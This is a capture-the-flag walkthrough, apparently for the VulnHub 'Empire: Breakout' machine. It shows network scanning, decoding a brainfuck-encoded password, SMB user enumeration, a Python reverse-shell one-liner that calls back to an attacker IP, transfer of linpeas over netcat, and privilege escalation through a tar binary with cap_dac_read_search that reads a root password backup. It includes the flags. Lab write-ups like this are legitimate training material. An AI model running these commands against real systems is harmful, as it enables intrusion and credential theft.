## Nmap Scan
```sh
sudo nmap -sP -PO 192.168.43.0-255
```

```sh
nmap -sV 192.168.43.105 -v
```

```
PORT      STATE SERVICE     VERSION  
80/tcp    open  http        Apache httpd 2.4.51 ((Debian))  
139/tcp   open  netbios-ssn Samba smbd 4.6.2  
445/tcp   open  netbios-ssn Samba smbd 4.6.2  
10000/tcp open  http        MiniServ 1.981 (Webmin httpd)  
20000/tcp open  http        MiniServ 1.830 (Webmin httpd)
```

## FFUF Scan
```sh
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://192.168.43.105/FUZZ
```

```
.htaccess               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 7ms]  
.hta                    [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 12ms]  
.htpasswd               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 61ms]  
index.html              [Status: 200, Size: 11159, Words: 3444, Lines: 519, Duration: 7ms]  
manual                  [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 24ms]  
server-status           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 6ms]
```

## HTML Debug
```sh
curl http://192.168.43.105/ | bat --language=html
```

```
<!--
don't worry no one will get here, it's safe to share with you my access. Its encrypted :)

++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>++++++++++++++++.++++.>>+++++++++++++++++.----.<++++++++++.-----------.>-----------.++++.<<+.>-.--------.++++++++++++++++++++.<------------.>>---------.<<++++++.++++++.


-->
```

### Decode brainfuck
```python
import brainfuck
brainfuck_code = "++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>++++++++++++++++.++++.>>+++++++++++++++++.----.<++++++++++.-----------.>-----------.++++.<<+.>-.--------.++++++++++++++++++++.<------------.>>---------.<<++++++.++++++."
flag = brainfuck.evaluate(brainfuck_code)
print(flag)
```

```
.2uqPEfj3D<P'a-3
```

## Enum4linux Scan
```sh
enum4linux -a 192.168.43.105
```

```
---
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
---

S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)  
S-1-5-32-546 BUILTIN\Guests (Local Group)  
S-1-5-32-547 BUILTIN\Power Users (Local Group)  
S-1-5-32-548 BUILTIN\Account Operators (Local Group)  
S-1-5-32-549 BUILTIN\Server Operators (Local Group)  
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

---

S-1-5-21-1683874020-4104641535-3793993001-501 BREAKOUT\nobody (Local User)
S-1-5-21-1683874020-4104641535-3793993001-513 BREAKOUT\None (Domain Group)

---

S-1-22-1-1000 Unix User\cyber (Local User)
```

## Login Usermin
https://192.168.43.105:20000
```
username: cyber
password: .2uqPEfj3D<P'a-3
```

## Check Weak Binarys
```sh
find / -perm -4000 -type f 2>/dev/null
```

```sh
getcap -r / 2>/dev/null
```

```
/home/cyber/tar cap_dac_read_search=ep
/usr/bin/ping cap_net_raw=ep
```
> Note:
> CAP_DAC_READ_SEARCH **allows to ignore the read permission bits and does also allow to execute the system call open_by_handle_at which can be used to read outside a container chroot**.

## Back Door User cyber 
attacker
```sh
nc -lvnp 1234
```
target
```sh
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.43.171",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```
## Check with linpeas 
attacker
```sh
wget https://github.com/carlospolop/PEASS-ng/releases/download/20220511/linpeas.sh
```
target
```sh
nc -l -p 1234 > linpeas.sh
```
attacker
```
nc -w 3 192.168.43.105 1234 < linpeas.sh
```
target
```sh
chmod +x linpeas.sh
./linpeas.sh
```
output //important information
```
Vulnerable to CVE-2022-0847 // unitended vuln?
[CVE-2021-3490] eBPF ALU32 bounds tracking for bitwise ops // unitended vuln?
[+] [CVE-2022-0847] DirtyPipe // unitended vuln?
uid=1000(cyber) gid=1000(cyber) groups=1000(cyber),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev) // vidio grup vuln?
passwd file: /usr/share/bash-completion/completions/passwd // bash auto complete password?
-rw------- 1 root root 17 Oct 20  2021 /var/backups/.old_pass.bak //the password?
```
## Privilage Escalation Using cap_dac_read_search Permission in ~/tar ELF
```
./tar -cf password.tar /var/backups/.old_pass.bak
tar -xf password.tar
```
# Flag
user Flag: 3mp!r3{You_Manage_To_Break_To_My_Secure_Access}
root Flag: 3mp!r3{You_Manage_To_BreakOut_From_My_System_Congratulation}
# Reference
https://resources.infosecinstitute.com/topic/empire-breakout-vulnhub-ctf-walkthrough/
https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#pe-method-2